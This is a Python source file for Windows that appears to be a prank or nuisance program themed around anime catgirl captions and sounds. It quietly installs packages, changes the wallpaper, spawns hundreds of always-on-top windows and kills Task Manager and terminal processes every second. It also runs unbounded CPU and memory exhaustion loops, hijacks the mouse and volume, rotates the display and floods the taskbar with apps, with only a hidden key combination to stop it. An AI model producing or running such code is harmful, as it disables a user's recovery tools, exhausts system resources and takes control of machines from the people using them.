import sys
import subprocess
import psutil
import ctypes
import win32gui
import win32con

def install_and_import(package, import_name=None):
    import importlib
    try:
        importlib.import_module(import_name or package)
    except ImportError:
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", package],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

install_and_import("pillow", "PIL")
install_and_import("playsound")
install_and_import("psutil")
install_and_import("pywin32", "win32gui")
install_and_import("pyautogui")

import tkinter as tk
from PIL import Image, ImageTk
import threading
from random import randint, choice
import time
import os
from playsound import playsound

IMAGE_FILES = [
    "1.jpg",
    "2.jpg",
    "3.jpg",
    "4.jpg",
    "5.jpg",
    "6.jpg",
    "7.jpg",
    "8.jpg",
    "9.jpg",
    "10.jpg",
]

CAPTIONS = [
    "UwU what's this?",
    "Senpai noticed me!",
    "Nya~ I'm a kitty!",
    "Femboy vibes activated",
    "So cute, can't stop!",
    "Desu desu!",
    "Purr~",
    "OwO what's that?",
    ">w< Nyaaaan!",
]

CATGIRL_SOUNDS = [
    "1.mp3",
    "2.mp3",
    "3.mp3"
]

pressed_keys = set()
stop_combo = {'i', 'c', 'y'}

windows = []
windows_lock = threading.Lock()
running = True

def fetch_image(filename):
    try:
        path = os.path.abspath(filename)
        image = Image.open(path).resize((150, 150), Image.ANTIALIAS)
        return ImageTk.PhotoImage(image)
    except Exception:
        blank = Image.new('RGBA', (150, 150), (255, 182, 193, 255))
        return ImageTk.PhotoImage(blank)

def create_window(root, image, caption):
    win = tk.Toplevel(root)
    win.overrideredirect(True)
    win.attributes("-topmost", True)
    win.configure(background='#ff9cea')
    screen_width = win.winfo_screenwidth()
    screen_height = win.winfo_screenheight()
    win_width, win_height = int(screen_width * 0.7), int(screen_height * 0.7)
    x = randint(0, screen_width - win_width)
    y = randint(0, screen_height - win_height)
    win.geometry(f"{win_width}x{win_height}+{x}+{y}")

    label_img = tk.Label(win, image=image, bg='#ff9cea')
    label_img.image = image
    label_img.pack(expand=True, fill='both')

    label_text = tk.Label(win, text=caption, bg='#ff9cea', fg='#ff79c6',
                          font=('Comic Sans MS', 32, 'bold'))
    label_text.pack()

    def start_drag(event):
        win.x = event.x
        win.y = event.y

    def do_drag(event):
        dx = event.x - win.x
        dy = event.y - win.y
        geom = win.geometry()
        parts = geom.split('+')
        if len(parts) >= 3:
            curr_x = int(parts[1])
            curr_y = int(parts[2])
            new_x = curr_x + dx
            new_y = curr_y + dy
            win.geometry(f"+{new_x}+{new_y}")

    win.bind('<Button-1>', start_drag)
    win.bind('<B1-Motion>', do_drag)

    def shake():
        if not running:
            return
        try:
            for _ in range(10):
                win.geometry(f"+{x + randint(-20,20)}+{y + randint(-20,20)}")
                win.update()
                time.sleep(0.01)
            win.geometry(f"+{x}+{y}")
        except:
            pass
    threading.Thread(target=shake, daemon=True).start()

    return win

def play_catgirl_sound():
    try:
        sound_file = choice(CATGIRL_SOUNDS)
        threading.Thread(target=playsound, args=(sound_file,), daemon=True).start()
    except Exception:
        pass

def spawn_windows(root):
    global running
    while running:
        with windows_lock:
            for _ in range(5):
                if len(windows) < 200:
                    filename = choice(IMAGE_FILES)
                    img = fetch_image(filename)
                    caption = choice(CAPTIONS)
                    win = create_window(root, img, caption)
                    windows.append(win)
                    play_catgirl_sound()
        time.sleep(0.005)

def cpu_stress():
    while running:
        x = 0
        for i in range(1000000):
            x += i*i

def memory_stress():
    mem_list = []
    while running:
        mem_list.append([0]*1000000) 
        time.sleep(0.1)

def key_press(event):
    key = event.keysym.lower()
    pressed_keys.add(key)
    if stop_combo.issubset(pressed_keys):
        stop_all()

def key_release(event):
    key = event.keysym.lower()
    if key in pressed_keys:
        pressed_keys.remove(key)

def stop_all():
    global running
    running = False
    with windows_lock:
        for w in windows:
            try:
                w.destroy()
            except:
                pass
        windows.clear()
    root.destroy()

def close_task_manager_and_terminal():
    TERMINAL_PROCESSES = [
        "cmd.exe", "powershell.exe", "wt.exe", "conhost.exe", "terminal.exe"
    ]
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception:
        pass

    while running:
        try:
            win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_FORCEMINIMIZE)
        except Exception:
            pass

        for proc in psutil.process_iter(['name']):
            name = proc.info['name']
            if name and name.lower() in ["taskmgr.exe"] + TERMINAL_PROCESSES:
                try:
                    proc.kill()
                except Exception:
                    pass
        time.sleep(1)

def show_resource_usage():
    usage_win = tk.Toplevel()
    usage_win.overrideredirect(True)
    usage_win.attributes("-topmost", True)
    usage_win.geometry("+20+20")
    usage_win.configure(bg="#222222")
    label = tk.Label(usage_win, text="", fg="#39ff14", bg="#222222", font=("Consolas", 14, "bold"))
    label.pack(padx=10, pady=5)

    def update_usage():
        if not running:
            usage_win.destroy()
            return
        cpu = psutil.cpu_percent(interval=0.1)
        mem = psutil.virtual_memory().percent
        label.config(text=f"CPU: {cpu:.1f}%\nRAM: {mem:.1f}%")
        usage_win.after(300, update_usage)

    update_usage()

def set_wallpaper(image_path):
    import tempfile
    from PIL import Image
    bmp_image = Image.open(image_path)
    temp_bmp = tempfile.NamedTemporaryFile(delete=False, suffix='.bmp')
    bmp_image.save(temp_bmp, 'BMP')
    temp_bmp.close()
    ctypes.windll.user32.SystemParametersInfoW(20, 0, temp_bmp.name, 3)

def annoy_user():
    while running:
        try:
            ctypes.windll.user32.FlashWindow(ctypes.windll.kernel32.GetConsoleWindow(), True)
        except:
            pass
        try:
            import winsound
            winsound.Beep(randint(200, 2000), 100)
        except:
            pass
        time.sleep(0.5)

def random_move_windows():
    while running:
        with windows_lock:
            for w in windows:
                try:
                    x = randint(0, w.winfo_screenwidth() - w.winfo_width())
                    y = randint(0, w.winfo_screenheight() - w.winfo_height())
                    w.geometry(f"+{x}+{y}")
                except:
                    pass
        time.sleep(1)

def spam_window_titles():
    while running:
        with windows_lock:
            for w in windows:
                try:
                    w.title(choice(CAPTIONS) + " " + str(randint(0, 9999)))
                except:
                    pass
        time.sleep(0.2)

def random_minimize_restore():
    while running:
        with windows_lock:
            for w in windows:
                try:
                    if randint(0, 1):
                        w.iconify()
                    else:
                        w.deiconify()
                except:
                    pass
        time.sleep(0.7)

def jump_mouse():
    import pyautogui
    while running:
        try:
            screen_width, screen_height = pyautogui.size()
            pyautogui.moveTo(randint(0, screen_width-1), randint(0, screen_height-1), duration=0.1)
        except:
            pass
        time.sleep(0.5)

def random_volume():
    import ctypes
    import random
    try:
        from ctypes import POINTER, cast
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pycaw", "comtypes"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        from ctypes import POINTER, cast
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    while running:
        try:
            volume.SetMasterVolumeLevelScalar(random.uniform(0.0, 1.0), None)
        except:
            pass
        time.sleep(0.3)

def flip_screen():
    while running:
        try:
            orientation = randint(0, 3)
            ctypes.windll.user32.ChangeDisplaySettingsW(None, 0)
            dm = ctypes.create_string_buffer(220)
            ctypes.windll.user32.EnumDisplaySettingsW(None, 0, dm)
            ctypes.memset(ctypes.addressof(dm) + 72, orientation, 4)
            ctypes.windll.user32.ChangeDisplaySettingsW(dm, 0)
        except:
            pass
        time.sleep(10)

def open_cd_tray():
    while running:
        try:
            ctypes.windll.WINMM.mciSendStringW(u"set cdaudio door open", None, 0, None)
        except:
            pass
        time.sleep(15)

def flood_taskbar():
    APPS = [
        "notepad.exe",
        "calc.exe",
        "mspaint.exe",
        "write.exe",
        "explorer.exe",
        "cmd.exe",
        "powershell.exe"
    ]
    while running:
        try:
            app = choice(APPS)
            subprocess.Popen(app, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass
        time.sleep(0.2) 

if __name__ == "__main__":
    root = tk.Tk()
    root.withdraw()


    set_wallpaper("2.jpg")  

    show_resource_usage() 

    root.bind_all("<KeyPress>", key_press)
    root.bind_all("<KeyRelease>", key_release)

    threading.Thread(target=spawn_windows, args=(root,), daemon=True).start()
    threading.Thread(target=close_task_manager_and_terminal, daemon=True).start()
    threading.Thread(target=cpu_stress, daemon=True).start()
    threading.Thread(target=memory_stress, daemon=True).start()
    threading.Thread(target=annoy_user, daemon=True).start()
    threading.Thread(target=random_move_windows, daemon=True).start()
    threading.Thread(target=spam_window_titles, daemon=True).start()
    threading.Thread(target=random_minimize_restore, daemon=True).start()
    threading.Thread(target=jump_mouse, daemon=True).start()
    threading.Thread(target=random_volume, daemon=True).start()
    threading.Thread(target=flip_screen, daemon=True).start()
    threading.Thread(target=open_cd_tray, daemon=True).start()
    threading.Thread(target=flood_taskbar, daemon=True).start()

    root.mainloop()
